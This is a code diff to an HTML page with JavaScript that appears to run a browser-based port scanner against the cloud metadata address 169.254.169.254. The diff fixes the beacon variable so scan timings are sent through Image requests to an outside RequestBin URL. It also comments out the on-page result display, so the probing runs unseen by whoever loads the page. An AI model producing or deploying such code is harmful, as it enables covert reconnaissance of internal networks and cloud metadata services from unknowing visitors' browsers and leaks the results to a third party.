@@ -5,6 +5,10 @@
     <title></title>
   </head>
   <body>
+    <div id="testdiv"></div>
+    <div id="custom_result"></div>
+    <div id="custom_button"></div>
+    
     <script>
     let LOG_URL = "http://requestbin.net/r/hgaw6u8b";
     let LOCAL_HOST = "169.254.169.254";
@@ -113,22 +117,22 @@
 
           scanner.on_stealthed = function () {
               if (scanner.timed_out) {
-                    let im = new Image();
-                  img.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC";
-                  document.getElementById("custom_result").innerHTML = "Case 2 (no response after 10s).";
+                  let im = new Image();
+                  im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC";
+                  //document.getElementById("custom_result").innerHTML = "Case 2 (no response after 10s).";
               } else {
                   time = this.total_time;
                   let im = new Image();
-                  img.src=LOG_URL+"?TIME="+time;
+                  im.src=LOG_URL+"?TIME="+time;
                 
-                  document.getElementById("custom_result").innerHTML = "Case 2 (" + this.total_time + " ms).";
+                 // document.getElementById("custom_result").innerHTML = "Case 2 (" + this.total_time + " ms).";
               }
               document.getElementById("custom_button").disabled = false;
           }
 
           scanner.on_open_or_closed = function () {
-              document.getElementById("custom_result").innerHTML = "Case 1 (" + this.total_time + " ms)."
-              document.getElementById("custom_button").disabled = false;
+              //document.getElementById("custom_result").innerHTML = "Case 1 (" + this.total_time + " ms)."
+              //document.getElementById("custom_button").disabled = false;
           }
 
           scanner.run();
